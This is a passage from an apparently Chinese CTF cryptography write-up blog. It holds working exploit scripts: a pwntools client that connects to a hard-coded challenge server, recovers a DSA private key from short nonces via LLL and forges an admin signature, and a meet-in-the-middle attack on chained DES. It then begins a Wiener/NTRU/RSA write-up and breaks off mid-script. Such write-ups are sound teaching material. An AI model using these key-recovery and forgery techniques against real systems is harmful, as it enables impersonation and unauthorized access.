<span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># io = remote(argv[1], argv[2])</span></span><br><span class="line">io = remote(<span class="string">"47.115.135.229"</span>, <span class="string">"10000"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"sha256"</span>)</span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = unhexlify(re.findall(<span class="string">r"XXX \+ ([^\)]+)"</span>, msg)[<span class="number">0</span>]).decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    cipher = re.findall(<span class="string">r"== ([^\n]+)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest() ==</span><br><span class="line">                        cipher, bytes(range(<span class="number">256</span>)).decode(<span class="string">"latin-1"</span>), length=<span class="number">3</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me XXX in hex: "</span>, hexlify(proof.encode(<span class="string">"latin-1"</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dsa_params</span><span class="params">()</span>:</span></span><br><span class="line">    params = io.recvuntil(<span class="string">"exit\n"</span>).strip().decode()</span><br><span class="line">    p = int(re.findall(<span class="string">r"p = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    q = int(re.findall(<span class="string">r"q = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    g = int(re.findall(<span class="string">r"g = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    y = int(re.findall(<span class="string">r"y = ([0-9]*?)\n"</span>, params)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">"p"</span>:p, <span class="string">"q"</span>:q, <span class="string">"g"</span>:g, <span class="string">"y"</span>:y&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please input your username: "</span>, m)</span><br><span class="line">    io.recvuntil(<span class="string">"k.bit_length() == "</span>)</span><br><span class="line">    kbits = int(io.recvline().strip().decode())</span><br><span class="line">    io.recvuntil(<span class="string">"Here is your signature in hex: "</span>)</span><br><span class="line">    sig = io.recvline().strip().decode(<span class="string">"latin-1"</span>)</span><br><span class="line">    r = int(sig[<span class="number">2</span>*len(m):<span class="number">2</span>*(len(m)+<span class="number">20</span>)], <span class="number">16</span>)</span><br><span class="line">    s = int(sig[<span class="number">2</span>*(len(m)+<span class="number">20</span>):], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> r, s, kbits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_as_admin</span><span class="params">(pubkey, prikey)</span>:</span></span><br><span class="line">    g, p, q, x = pubkey[<span class="string">'g'</span>], pubkey[<span class="string">'p'</span>], pubkey[<span class="string">'q'</span>], prikey</span><br><span class="line">    k = <span class="number">114514</span></span><br><span class="line">    Hm = int.from_bytes(sha256(<span class="string">b"admin"</span>).digest(), <span class="string">'big'</span>)</span><br><span class="line">    r = int(pow(g, k, p)) % q</span><br><span class="line">    s = (inverse(k, q) * (Hm + x*r)) % q</span><br><span class="line">    payload = hexlify(<span class="string">b"admin"</span> + long_to_bytes(r).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>) + long_to_bytes(s).rjust(<span class="number">20</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">"$ "</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Please send me your signature: "</span>, payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_x</span><span class="params">(pubkey)</span>:</span></span><br><span class="line">    q, g = pubkey[<span class="string">'q'</span>], pubkey[<span class="string">'g'</span>]</span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">        M_list.append([q * int(i == j) <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>)])</span><br><span class="line">    m = <span class="string">b"0xDktb"</span></span><br><span class="line">    Hm = int.from_bytes(sha256(m).digest(), <span class="string">'big'</span>)</span><br><span class="line">    As = []</span><br><span class="line">    Bs = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">35</span>:</span><br><span class="line">        r, s, kbits = sign(m)</span><br><span class="line">        <span class="keyword">if</span> kbits &gt; <span class="number">121</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        A = (inverse(s, q) * Hm) % q</span><br><span class="line">        B = (inverse(s, q) * r) % q</span><br><span class="line">        As.append(A)</span><br><span class="line">        Bs.append(B)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"[&#123;:0&gt;2d&#125;] k(&#123;&#125; bits) found!"</span>.format(i, kbits))</span><br><span class="line">    Bs = Bs + [<span class="number">1</span>/(<span class="number">2</span>**<span class="number">64</span>), <span class="number">0</span>]</span><br><span class="line">    As = As + [<span class="number">0</span>, <span class="number">2</span>**<span class="number">64</span>]</span><br><span class="line">    M_list.append(Bs)</span><br><span class="line">    M_list.append(As)</span><br><span class="line">    M = Matrix(QQ, M_list)</span><br><span class="line">    ML = M.LLL()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ML:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">-1</span>] == (<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">            prikey = (line[<span class="number">-2</span>] * (<span class="number">2</span>**<span class="number">64</span>)) % q</span><br><span class="line">            print(<span class="string">"[+] SVP's solution found! prikey = &#123;&#125;"</span>.format(prikey))</span><br><span class="line">            <span class="keyword">return</span> prikey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    pubkey = get_dsa_params()</span><br><span class="line">    prikey = crack_x(pubkey)</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    login_as_admin(pubkey, prikey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">dktb@ubuntu:/mnt/hgfs/share/HNP$ sage -¾","m!\x7f" -- 44.596%</span></span><br><span class="line"><span class="string">                           z¼","ð&#125;","*&gt;","'¿" -- 54.467%</span></span><br><span class="line"><span class="string">[+] MBruteforcing: Found key: "Ã"</span></span><br><span class="line"><span class="string">[01] k(121 bits) found!</span></span><br><span class="line"><span class="string">[02] k(121 bits) found!</span></span><br><span class="line"><span class="string">[03] k(120 bits) found!</span></span><br><span class="line"><span class="string">[04] k(121 bits) found!</span></span><br><span class="line"><span class="string">[05] k(117 bits) found!</span></span><br><span class="line"><span class="string">[06] k(121 bits) found!</span></span><br><span class="line"><span class="string">[07] k(121 bits) found!</span></span><br><span class="line"><span class="string">[08] k(120 bits) found!</span></span><br><span class="line"><span class="string">[09] k(121 bits) found!</span></span><br><span class="line"><span class="string">[10] k(121 bits) found!</span></span><br><span class="line"><span class="string">[11] k(115 bits) found!</span></span><br><span class="line"><span class="string">[12] k(121 bits) found!</span></span><br><span class="line"><span class="string">[13] k(119 bits) found!</span></span><br><span class="line"><span class="string">[14] k(120 bits) found!</span></span><br><span class="line"><span class="string">[15] k(121 bits) found!</span></span><br><span class="line"><span class="string">[16] k(121 bits) found!</span></span><br><span class="line"><span class="string">[17] k(118 bits) found!</span></span><br><span class="line"><span class="string">[18] k(120 bits) found!</span></span><br><span class="line"><span class="string">[19] k(121 bits) found!</span></span><br><span class="line"><span class="string">[20] k(121 bits) found!</span></span><br><span class="line"><span class="string">[21] k(120 bits) found!</span></span><br><span class="line"><span class="string">[22] k(121 bits) found!</span></span><br><span class="line"><span class="string">[23] k(121 bits) found!</span></span><br><span class="line"><span class="string">[24] k(121 bits) found!</span></span><br><span class="line"><span class="string">[25] k(121 bits) found!</span></span><br><span class="line"><span class="string">[26] k(118 bits) found!</span></span><br><span class="line"><span class="string">[27] k(121 bits) found!</span></span><br><span class="line"><span class="string">[28] k(116 bits) found!</span></span><br><span class="line"><span class="string">[29] k(121 bits) found!</span></span><br><span class="line"><span class="string">[30] k(121 bits) found!</span></span><br><span class="line"><span class="string">[31] k(120 bits) found!</span></span><br><span class="line"><span class="string">[32] k(118 bits) found!</span></span><br><span class="line"><span class="string">[33] k(121 bits) found!</span></span><br><span class="line"><span class="string">[34] k(121 bits) found!</span></span><br><span class="line"><span class="string">[35] k(121 bits) found!</span></span><br><span class="line"><span class="string">[+] SVP's solution found! prikey = 72250087844423678254657706833192856476</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    b'2\n'</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x1f bytes:</span></span><br><span class="line"><span class="string">    b'Please send me your signature: '</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x5b bytes:</span></span><br><span class="line"><span class="string">    b'61646d696e000000005f97da6d7e9faf6a182ff43f3cb4bd1000000000b5a29a7038325fee75abbf8372eccece\n'</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x67 bytes:</span></span><br><span class="line"><span class="string">    b'Welcome, admin\n'</span></span><br><span class="line"><span class="string">    b'The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;\n'</span></span><br><span class="line"><span class="string">    b'\n'</span></span><br><span class="line"><span class="string">    b'1. sign up\n'</span></span><br><span class="line"><span class="string">    b'2. sign in\n'</span></span><br><span class="line"><span class="string">    b'3. exit\n'</span></span><br><span class="line"><span class="string">    b'$ '</span></span><br><span class="line"><span class="string">Welcome, admin</span></span><br><span class="line"><span class="string">The flag is flag&#123;25903ADB-15B6-44D7-A027-CAE500675EA5&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="b01lers2020-Des-MMXX"><a href="#b01lers2020-Des-MMXX" class="headerlink" title="[b01lers2020 - Des-MMXX]"></a>[b01lers2020 - Des-MMXX]</h3><h4 id="题目考点-2"><a href="#题目考点-2" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">seed = <span class="string">b'secret_sauce_#9'</span>   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br></pre></td></tr></table></figure><p>2020个keys均已知，关注以下加密逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SECRET = <span class="number">0xa</span><span class="comment">########e          # remember to erase this later..</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(keys, msg)</span>:</span></span><br><span class="line">   dk = scramble(SECRET)</span><br><span class="line">   <span class="keyword">for</span> v <span class="keyword">in</span> keys:</span><br><span class="line">      idx = dk &amp; <span class="number">3</span></span><br><span class="line">      dk &gt;&gt;= <span class="number">2</span></span><br><span class="line">      k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">      cp = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))  </span><br><span class="line">      msg = cp.encrypt(msg)</span><br><span class="line">   <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">   msg = f.read()</span><br><span class="line"></span><br><span class="line">ctxt = encrypt(keys, msg)</span><br></pre></td></tr></table></figure><p><code>scramble</code>使SECRET割裂成了两个20bits，并各自重复101次，在encrypt开头形成4040bits的dk</p><p>很明显的中间相遇攻击的逻辑，但buu缺了一对明密文条件…人傻了</p><p>于是上ctftime上找了官方仓库里原有的那对明密文，拿到以后直接MEET IN THE MIDDLE即可</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">seed = <span class="string">b'secret_sauce_#9'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">(s)</span>:</span></span><br><span class="line">   keys = []</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2020</span>):</span><br><span class="line">      s = sha256(s).digest()</span><br><span class="line">      keys.append(s)</span><br><span class="line">   <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">keys = keygen(seed)</span><br><span class="line"></span><br><span class="line">upper_key = keys[<span class="number">1010</span>:][::<span class="number">-1</span>]</span><br><span class="line">lower_key = keys[:<span class="number">1010</span>]</span><br><span class="line">upper_dk = <span class="number">0x0000e</span></span><br><span class="line">lower_dk = <span class="number">0xa0000</span></span><br><span class="line">pt = <span class="string">b"Attack at DAWN!!"</span></span><br><span class="line">ct = <span class="string">b"\x15\x08\x54\xff\x3c\xf4\xc4\xc0\xd2\x3b\xd6\x8a\x82\x34\x83\xbe"</span></span><br><span class="line"></span><br><span class="line">orig_ct = ct</span><br><span class="line">upper_side = []</span><br><span class="line"><span class="keyword">for</span> ud <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_upper_dk = format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = (i * <span class="number">2</span>) % <span class="number">20</span></span><br><span class="line">        idx = int(guess_upper_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = upper_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        ct = des.decrypt(ct)</span><br><span class="line">    upper_side.append(ct)</span><br><span class="line">    ct = orig_ct</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|████████████████████████████████████████████████████████████████████████████| 65536/65536 [19:31&lt;00:00, 55.93it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orig_pt = pt</span><br><span class="line">lower_side = []</span><br><span class="line"><span class="keyword">for</span> ld <span class="keyword">in</span> tqdm(range(<span class="number">0x10000</span>)):</span><br><span class="line">    guess_lower_dk = format(ld + lower_dk, <span class="string">'020b'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1010</span>):</span><br><span class="line">        _ = <span class="number">18</span> - ((i * <span class="number">2</span>) % <span class="number">20</span>)</span><br><span class="line">        idx = int(guess_lower_dk[_:_+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        k = lower_key[i][idx*<span class="number">8</span>:idx*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">        pt = des.encrypt(pt)</span><br><span class="line">    lower_side.append(pt)</span><br><span class="line">    pt = orig_pt</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">100%|████████████████████████████████████████████████████████████████████████████| 65536/65536 [19:33&lt;00:00, 55.85it/s]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">crash = list(set(upper_side) &amp; set(lower_side))[<span class="number">0</span>]</span><br><span class="line">ud = upper_side.index(crash)</span><br><span class="line">ld = lower_side.index(crash)</span><br><span class="line">SECRET = int(format(ld + lower_dk, <span class="string">'020b'</span>) + format((ud &lt;&lt; <span class="number">4</span>) + upper_dk, <span class="string">'020b'</span>), <span class="number">2</span>)</span><br><span class="line">enc_flag = open(<span class="string">"flag.enc"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scramble</span><span class="params">(s)</span>:</span></span><br><span class="line">   ret = <span class="string">""</span>.join( [format(s &amp; <span class="number">0xfffff</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   ret += <span class="string">""</span>.join( [format(s &gt;&gt; <span class="number">20</span>, <span class="string">'020b'</span>)]*<span class="number">101</span> )</span><br><span class="line">   <span class="keyword">return</span> int(ret, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dk = scramble(SECRET)</span><br><span class="line">dk = format(dk, <span class="string">'04040b'</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> keys[::<span class="number">-1</span>]:</span><br><span class="line">    idx = int(dk[i:i+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">    k = v[idx*<span class="number">8</span>:(idx+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    des = DES.new(k, DES.MODE_CBC, bytes(<span class="number">8</span>))</span><br><span class="line">    enc_flag = des.decrypt(enc_flag)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">enc_flag</span><br><span class="line"><span class="comment"># b'pctf&#123;Two_tO_thE_s1xt33n7h?_E4sy-p3asy..&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Training </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(WMCTF2020) - Crypto</title>
      <link href="/2020/08/02/WriteUp-WMCTF2020-Crypto/"/>
      <url>/2020/08/02/WriteUp-WMCTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p><strong>idiot box ===&gt; </strong>hellman拿了一血，祥哥拿了二血，顺利落幕（草草草草草草才知道hellman博士都毕业了dbq</p><p><img src= "/img/loading.gif" data-src="/2020/08/02/WriteUp-WMCTF2020-Crypto/QQ图片20200803093512.jpg" alt></p><h3 id="Piece-of-Cake"><a href="#Piece-of-Cake" class="headerlink" title="Piece of Cake"></a>Piece of Cake</h3><h4 id="题解分析"><a href="#题解分析" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>考察Wiener’s Attack &amp; NTRU正常解密 &amp; RSA common private key attack</p><p>在本题中，RSA cryptosystem的ph=(p-1)(q+1), ed=1(mod ph), 且d作为NTRU中的f</p><p><strong>Encryption(NTRU part)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># case 2(make_cake)</span></span><br><span class="line">cake = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">1536</span>)</span><br><span class="line">size(f)\approx <span class="number">1024</span></span><br><span class="line">g = getPrime(<span class="number">1536</span> - size(f) - <span class="number">1</span>)</span><br><span class="line">size(f^&#123;<span class="number">-1</span>&#125;)\approx <span class="number">1536</span></span><br><span class="line">h = g * f^&#123;<span class="number">-1</span>&#125;</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line">c = (r * h + cake) % q <span class="comment"># size(c)\approx 1536</span></span><br></pre></td></tr></table></figure><h5 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h5><p><strong>Step 1</strong></p><p>$\because fh\equiv g(mod\ q)$</p><p>$\therefore fh=kq+g\Rightarrow\frac{h}{q}=\frac{k}{f}+\frac{g}{fq}\Rightarrow|\frac{h}{q}-\frac{k}{f}|=\frac{g}{fq}$</p><p>Now prove $\frac{1}{2f^2}&gt;\frac{g}{fq}$ which is equivalent to $q&gt;2fg$. </p><p><code>g = getPrime(q.bit_length() - f.bit_length() - 1)</code>, <strong>Satisfies!</strong></p><p><strong>Step 2</strong></p><p>For candidate $(f,g)$</p><p>On Zmod(q), $c=rh+cake=rgf^{-1}+cake$</p><p>$\therefore cf=rg+f\cdot cake$. (bit_length: r = 512; g ≈ 511; f ≈ 1024; q = 1536)</p><p> In case 1(eat_cake), size(cake) = 768, while in case 2(make_cake), size(cake) = 256</p><p>Hence we have $rg+f\cdot cake$ equivalent to Zmod(q) and ZZ which means that <strong>cake can be recover in case 2.</strong> </p><p>If we get correct cake, we also have d in RSA cryptosystem. </p><p>However, in this challenge, we have $ed-1=k(p-1)(q+1)$, not $ed-1=k(p-1)(q-1)$</p><p>$ed-kN=1+k(p-q-1)$</p><p>Cuz s = p-q-1 is also $&lt;3N^{1/2}$, LLL will be successful to obtain common e. (like <a href="https://0xdktb.top/2020/07/06/WriteUp-SCTF2020-Crypto/#rsa" target="_blank" rel="noopener">SCTF2020 RSA</a>)</p><p>size(e) = 477, $\delta=\frac{477}{1024}$</p><p>$\because\delta &lt;\frac{r}{2r+2}-log_{N_{r}}(6)$, $\therefore$ <strong>when $r\geq 15$, e must can be easily cracked.</strong></p><p><strong>Step 3</strong></p><p>After getting e, we use the same method to get d in case 1(eat_cake).</p><p>Then $ph=(p-1)(q+1),ed=1(mod\ ph)$, so $p\mid pow(2, ph, n),q\nmid pow(2,ph,n)$.</p><p>GCD to factor n, then get $ph’=ed’\equiv 1(mod\ (p-1)(q-1))$, finally <strong>getflag!</strong>  </p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><p>本地测试exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[102]:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">e = getPrime(<span class="number">477</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eat_cake</span><span class="params">()</span>:</span></span><br><span class="line">    p, q = getPrime(BITS), getPrime(BITS)</span><br><span class="line">    ph = (p - <span class="number">1</span>) * (q + <span class="number">1</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    d = inverse(e, ph)</span><br><span class="line">    </span><br><span class="line">    cake = getPrime(BITS &gt;&gt; <span class="number">1</span> | 